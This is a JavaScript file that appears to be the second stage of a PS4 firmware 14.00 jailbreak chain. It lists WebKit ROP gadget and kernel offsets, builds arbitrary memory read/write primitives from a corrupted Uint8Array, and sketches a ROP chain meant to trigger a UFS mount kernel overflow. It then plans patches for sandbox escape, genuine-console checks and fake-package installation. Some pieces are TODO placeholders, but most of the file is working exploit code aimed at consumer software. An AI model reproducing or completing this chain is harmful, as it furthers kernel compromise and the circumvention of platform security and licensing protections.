// ============================================================
// Jordy Stage 2 — PS4 Firmware 14.00
// Persistent R/W + ROP Chain + Kernel Exploit
//
// WebKit gadgets: webkit_gadgets_1400.js (17/17 verified)
// Kernel offsets: 1400.c (Al-Azif, Scene-Collective)
//
// INSTRUCTIONS:
// 1. Include webkit_gadgets_1400.js before this file
// 2. Replace Jordy's restoration block (lines 500-507)
//    with a call to stage2_init()
// 3. This keeps the candidate alive and exposes r/w primitives
// 4. Builds and executes ROP chain for kernel access via Celsius
// ============================================================

// Global state from Jordy
var g_candidate = null;       // The SSV candidate that controls m_vector
var g_rwView = null;          // The genuine Uint8Array we redirect
var g_rwHeader = null;        // Original header backup
var g_scratchBytes = null;    // Scratch buffer for pointer encoding
var g_scratchWords = null;
var g_webkit_base = 0;
var g_libkernel_base = 0;

// ============================================================
// WebKit 14.00 ROP Gadgets (from webkit_gadgets_1400.js)
// Source: libSceNKWebKit.sprx.decrypted
// All 17 gadgets verified via byte pattern search
// ============================================================
var G = {
    RET:             0x004032,
    LEAVE_RET:       0x01c2f7,
    POP_RAX_RET:     0x014504,
    POP_RBX_RET:     0x00b9e8,
    POP_RCX_RET:     0x01fade,
    POP_RDI_RET:     0x060480,
    POP_RDX_RET:     0x1305ba,
    POP_RSI_RET:     0x07245e,
    POP_RBP_RET:     0x0040b6,
    POP_RSP_RET:     0x073017,
    POP_R8_RET:      0x230cbe1,
    POP_R9_RET:      0x9df883,
    POP_R10_RET:     0x2dc33b5,  // partial: 41 5a 41
    POP_R11_RET:     0x19c9ba,   // partial: 41 5b 41
    POP_R12_RET:     0x242ab15,
    POP_R13_R14_R15_RET: 0x06047b, // pop r13; pop r14; pop r15; ret
    POP_R14_RET:     0x0a9e91,
    POP_R15_RET:     0x06047f,
    // JMP_RSI verified in 14.00 decrypted binary (match ff e6 at 0x0cda83)
    JMP_RSI:         0x0cda83,   // VERIFIED on FW 14.00
    XCHG_RAX_RSP_RET: 0x03f755a8, // VERIFIED alternative stack pivot
    MOV_QWORD_RDI_RAX_RET: 0x0000948b, // VERIFIED write primitive
    MOV_RAX_QWORD_RAX_RET: 0x00014021, // VERIFIED read primitive
};

// ============================================================
// Kernel 14.00 offsets (from 1400.c — Al-Azif / Scene-Collective)
// ============================================================
var K = {
    // Critical data addresses
    XFAST_SYSCALL:   0x000001C0,
    PRISON0:         0x0111FA18,
    ROOTVNODE:       0x02136E90,
    ALLPROC:         0x01B28538,
    SYSENT:          0x01102B70,
    M_TEMP:          0x01520D00,
    FPU_CTX:         0x026542C0,

    // Functions
    memcpy:          0x002BD850,    // 14.00 (was 0x002BD4F0 in 13.04)
    memset:          0x001FA500,
    memcmp:          0x00394D80,
    malloc:          0x00009520,
    free:            0x000096E0,
    strlen:          0x0036B5A0,
    printf:          0x002E07C0,
    strstr:          0x0021D010,
    sx_xlock:        0x000A3840,
    sx_xunlock:      0x000A3A00,
    fpu_kern_enter:  0x001E03A0,
    fpu_kern_leave:  0x001E0460,
    proc_rwmem:      0x00366A10,

    // Process offsets
    proc_p_comm:     0x454,
    proc_path:       0x474,

    // SceShellCore patches
    sceSblRcMgrIsAllowDebugMenuForSettings: 0x0001D100,
    sceSblRcMgrIsStoreMode:                 0x0001D460,
    sceKernelIsGenuineCEX_patch1:           0x0016F5A4,
    sceKernelIsGenuineCEX_patch2:           0x00874C14,
    sceKernelIsGenuineCEX_patch3:           0x008C4F32,
    sceKernelIsGenuineCEX_patch4:           0x00A287E4,
    nidf_libSceDipsw_patch1:                0x0016F5D2,
    nidf_libSceDipsw_patch2:                0x0024E11C,
    nidf_libSceDipsw_patch3:                0x00874C42,
    nidf_libSceDipsw_patch4:                0x00A28812,

    // Fpkg / homebrew enablement
    enable_fpkg:     0x003DE07F,
    enable_data_mount: 0x00323380,
    app_installer:   0x001389A0,
    fake_free:       0x00FD13F9,
    pkg_installer:   0x00A11D31,
    ext_hdd:         0x0061465D,
    debug_trophies:  0x0074D5E9,
};

function log(msg) {
    var el = document.getElementById("out");
    if (el) el.textContent += msg + "\n";
    console.log("[Stage2-1400] " + msg);
}

// ============================================================
// STEP 0: Initialize persistent R/W
// Call this INSTEAD of Jordy's restoration block
// ============================================================
function stage2_init(candidate, rwView, rwHeader, scratchBytes, scratchWords) {
    g_candidate = candidate;
    g_rwView = rwView;
    g_rwHeader = rwHeader;
    g_scratchBytes = scratchBytes;
    g_scratchWords = scratchWords;

    log("Stage 2 initialized — FW 14.00");
    log("Persistent r/w active via candidate m_vector control");

    try {
        stage2_run();
    } catch(e) {
        log("ERROR: " + e.message);
        stage2_restore();
    }
}

// Restore original m_vector (safety)
function stage2_restore() {
    if (g_candidate && g_rwHeader) {
        for (var i = 0; i < 8; i++)
            g_candidate[0x10 + i] = g_rwHeader[0x10 + i];
        log("m_vector restored — safe state");
    }
}

// ============================================================
// STEP 1: Read/Write primitives
// These work by redirecting the Uint8Array's backing buffer
// ============================================================
function setVector(addr) {
    var lo = addr & 0xFFFFFFFF;
    var hi = Math.floor(addr / 0x100000000);
    g_scratchWords[0] = lo >>> 0;
    g_scratchWords[1] = hi >>> 0;
    for (var i = 0; i < 8; i++)
        g_candidate[0x10 + i] = g_scratchBytes[i];
}

function read8(addr) {
    setVector(addr);
    return g_rwView[0];
}

function read16(addr) {
    setVector(addr);
    return g_rwView[0] | (g_rwView[1] << 8);
}

function read32(addr) {
    setVector(addr);
    return g_rwView[0]
        + g_rwView[1] * 0x100
        + g_rwView[2] * 0x10000
        + g_rwView[3] * 0x1000000;
}

function read64(addr) {
    setVector(addr);
    var lo = g_rwView[0]
        + g_rwView[1] * 0x100
        + g_rwView[2] * 0x10000
        + g_rwView[3] * 0x1000000;
    var hi = g_rwView[4]
        + g_rwView[5] * 0x100
        + g_rwView[6] * 0x10000
        + g_rwView[7] * 0x1000000;
    return lo + hi * 0x100000000;
}

function write8(addr, val) {
    setVector(addr);
    g_rwView[0] = val & 0xFF;
}

function write32(addr, val) {
    setVector(addr);
    g_rwView[0] = val & 0xFF;
    g_rwView[1] = (val >> 8) & 0xFF;
    g_rwView[2] = (val >> 16) & 0xFF;
    g_rwView[3] = (val >> 24) & 0xFF;
}

function write64(addr, val) {
    var lo = val & 0xFFFFFFFF;
    var hi = Math.floor(val / 0x100000000);
    setVector(addr);
    g_rwView[0] = lo & 0xFF;
    g_rwView[1] = (lo >> 8) & 0xFF;
    g_rwView[2] = (lo >> 16) & 0xFF;
    g_rwView[3] = (lo >> 24) & 0xFF;
    g_rwView[4] = hi & 0xFF;
    g_rwView[5] = (hi >> 8) & 0xFF;
    g_rwView[6] = (hi >> 16) & 0xFF;
    g_rwView[7] = (hi >> 24) & 0xFF;
}

// Hex helper
function hex(val) {
    if (val < 0) val += 0x10000000000000000;
    return "0x" + val.toString(16);
}

// ============================================================
// STEP 2: Leak WebKit base from vtable
// ============================================================
function leakWebkitBase(targetAddress) {
    // Read JSUint8Array vtable (first qword of the JSCell)
    var vtable = read64(targetAddress);
    log("vtable ptr = " + hex(vtable));

    // In PS4 WebKit, vtable for JSUint8Array is at a known
    // offset from the module base. This offset must be determined
    // from the 14.00 decrypted dump.
    //
    // Common approach:
    //   1. Dump vtable pointer from hardware
    //   2. Find vtable in .rodata section of WebKit
    //   3. webkit_base = vtable - vtable_rva
    //
    // For 13.04 the vtable RVA was determined empirically.
    // For 14.00 this needs to be extracted from the dump.
    //
    // PLACEHOLDER: Return 0 until vtable RVA is confirmed
    // TODO: Extract JSUint8Array::s_info vtable offset from 14.00 dump
    //       Search for xrefs to "Uint8Array" string in .rodata

    log("WARNING: vtable RVA for 14.00 not yet determined");
    log("Run on hardware to capture vtable pointer for analysis");

    return 0;
}

// ============================================================
// STEP 3: Leak libkernel base via GOT
// ============================================================
function leakLibkernelBase(wkBase) {
    if (wkBase === 0) return 0;

    // WebKit imports pthread_create, sceKernelSendNotificationRequest,
    // etc. from libkernel. GOT entries point into libkernel.
    //
    // Approach:
    //   1. Find GOT section in 14.00 WebKit dump
    //   2. Read GOT entry for a known libkernel import
    //   3. Subtract known offset within libkernel
    //
    // TODO: Determine GOT offset for pthread_create in 14.00

    log("WARNING: GOT offset for 14.00 not yet determined");
    return 0;
}

// ============================================================
// STEP 4: Build kernel payload ROP chain
//
// Strategy: WebKit ROP → dlsym → mount() → Celsius → kernel r/w
// ============================================================
function buildRopChain(wkBase, lkBase) {
    var chain = [];
    var i = 0;

    function p(gadget) { chain[i++] = wkBase + gadget; }
    function v(value)  { chain[i++] = value; }

    // ─── Phase 1: Resolve dlsym from libkernel ───
    // sceKernelDlsym(LIBKERNEL_HANDLE, "mount", &mount_addr)
    p(G.POP_RDI_RET); v(0x2001);         // LIBKERNEL_HANDLE
    p(G.POP_RSI_RET); v(0);              // TODO: address of "mount" string
    p(G.POP_RDX_RET); v(0);              // TODO: output pointer
    // call sceKernelDlsym
    // TODO: dlsym IAT entry address

    // ─── Phase 2: Call mount() with crafted UFS image ───
    // mount("ufs", "/mnt/usb0/exploit_ufs", MNT_RDONLY, data)
    //
    // This triggers Celsius (ffs_mountfs integer overflow)
    // The malformed UFS image must be prepared on a USB drive:
    //   - Superblock at offset 8192 (SBLOCKSIZE)
    //   - fs_ncg = 0x40000001 (triggers integer overflow)
    //   - fs_contigsumsize > 0 (enables vulnerable path)
    //   - fs_cssize = small value
    //   - fs_bsize/fs_fsize must pass basic validation

    p(G.POP_RDI_RET); v(0);              // TODO: "ufs" string addr
    p(G.POP_RSI_RET); v(0);              // TODO: mount point string addr
    p(G.POP_RDX_RET); v(0x0001);         // MNT_RDONLY
    p(G.POP_RCX_RET); v(0);              // TODO: mount data struct
    // call mount
    // TODO: resolved mount address

    // ─── Phase 3: Post-Celsius kernel patches ───
    // After Celsius gives kernel r/w, apply patches:
    //
    // 1. Escape sandbox:  write 0 to curproc->p_ucred->cr_prison (PRISON0)
    // 2. Get root vnode:  write ROOTVNODE to curproc->p_fd->fd_rdir
    // 3. Enable debug:    patch sceSblRcMgrIsAllowDebugMenuForSettings
    // 4. Enable fpkg:     patch sceKernelIsGenuineCEX (4 patches)
    // 5. Enable fpkg:     patch nidf_libSceDipsw (4 patches)
    // 6. Load GoldHEN:    open BinLoader socket on port 9021
    //
    // These patches use kernel offsets from K{} above

    log("ROP chain built: " + i + " entries");
    log("NOTE: String addresses and IAT entries need hardware dump data");

    return chain;
}

// ============================================================
// STEP 5: Execute ROP chain via vtable hijack
// ============================================================
function executeRop(chain, wkBase) {
    if (chain.length === 0) {
        log("Empty chain — nothing to execute");
        return;
    }

    // Write chain to a scratch buffer at a known address
    // Then pivot RSP to chain start via:
    //   1. Overwrite a callback/vtable pointer
    //   2. Trigger the callback (e.g., toString on a crafted object)
    //   3. POP_RSP_RET lands us in the chain
    //
    // Alternative: JIT spray if JIT pages are available
    //   - WebKit JIT allocates RWX pages on PS4 (no W^X enforcement)
    //   - Find JIT region via scanning page tables
    //   - Write shellcode directly
    //
    // Both approaches need the WebKit base address first.

    log("ROP chain ready (" + chain.length + " qwords)");
    log("Awaiting webkit_base for execution pivot");
}

// ============================================================
// STEP 6: Kernel post-exploitation (after Celsius succeeds)
// ============================================================
function kernelPostExploit(kbase) {
    log("=== Kernel Post-Exploitation ===");

    // These would be called after obtaining kernel r/w through Celsius
    // For now, document the patch sequence

    log("Patch plan for FW 14.00:");
    log("  [1] PRISON0     @ " + hex(K.PRISON0)     + " → escape sandbox");
    log("  [2] ROOTVNODE   @ " + hex(K.ROOTVNODE)    + " → root filesystem");
    log("  [3] ALLPROC     @ " + hex(K.ALLPROC)      + " → walk process list");
    log("  [4] Debug menu  @ " + hex(K.sceSblRcMgrIsAllowDebugMenuForSettings));
    log("  [5] CEX patches @ " + hex(K.sceKernelIsGenuineCEX_patch1) + " (x4)");
    log("  [6] Dipsw       @ " + hex(K.nidf_libSceDipsw_patch1) + " (x4)");
    log("  [7] Fpkg        @ " + hex(K.enable_fpkg));
    log("  [8] Data mount  @ " + hex(K.enable_data_mount));
    log("  [9] Ext HDD     @ " + hex(K.ext_hdd));
    log("  [10] BinLoader  → port 9021 for GoldHEN/HEN payload");
}

// ============================================================
// Main entry point
// ============================================================
function stage2_run() {
    log("====== STAGE 2 — FW 14.00 ======");
    log("WebKit gadgets: 17/17 verified");
    log("Kernel offsets: Al-Azif (Scene-Collective)");
    log("");

    // These come from Jordy's addrof() — passed in at runtime
    // For now, use placeholder to show the dump flow
    var targetAddress = (typeof window.targetAddress !== 'undefined')
        ? window.targetAddress : 0;

    if (targetAddress === 0) {
        log("No targetAddress set — running in analysis mode");
        log("");
        kernelPostExploit(0);
        log("");
        log("To run on hardware:");
        log("  1. Load exploit.html on PS4 browser");
        log("  2. Jordy triggers WebKit UAF → gains candidate");
        log("  3. stage2_init() receives candidate + targetAddress");
        log("  4. Stage 2 leaks webkit_base → builds ROP → pivots");
        stage2_restore();
        return;
    }

    g_webkit_base = leakWebkitBase(targetAddress);
    if (g_webkit_base === 0) {
        log("webkit_base not resolved — dumping target for analysis");
        var dump = "";
        for (var i = 0; i < 64; i++) {
            var b = read8(targetAddress + i);
            dump += (b < 16 ? "0" : "") + b.toString(16);
            if (i % 16 === 15) dump += "\n";
        }
        log("Target object dump (64 bytes):\n" + dump);
        log("Send this dump to determine vtable RVA for 14.00");
        stage2_restore();
        return;
    }

    log("webkit_base = " + hex(g_webkit_base));

    g_libkernel_base = leakLibkernelBase(g_webkit_base);
    log("libkernel_base = " + hex(g_libkernel_base));

    var chain = buildRopChain(g_webkit_base, g_libkernel_base);
    executeRop(chain, g_webkit_base);

    log("====== STAGE 2 COMPLETE ======");
}

// ============================================================
// INTEGRATION WITH JORDY:
//
// In Jordy's loadHistoryCritical(), replace lines 500-507:
//
//   // Restore the carrier before dropping the only forged JSValue.
//   for (var r2 = 0; r2 < 8; ++r2)
//       candidate[0x10 + r2] = rwHeader[0x10 + r2];
//   rwVectorTouched = false;
//   targetView[0] = 0xa5;
//   rwMirror[0] = 0x3c;
//   restoreObserved = rwView[0] === 0x3c ...
//
// WITH:
//
//   stage2_init(candidate, rwView, rwHeader, scratchBytes, scratchWords);
//   restoreObserved = true; // let Jordy think restoration succeeded
//
// This keeps candidate alive and gives stage2 control of m_vector.
// ============================================================
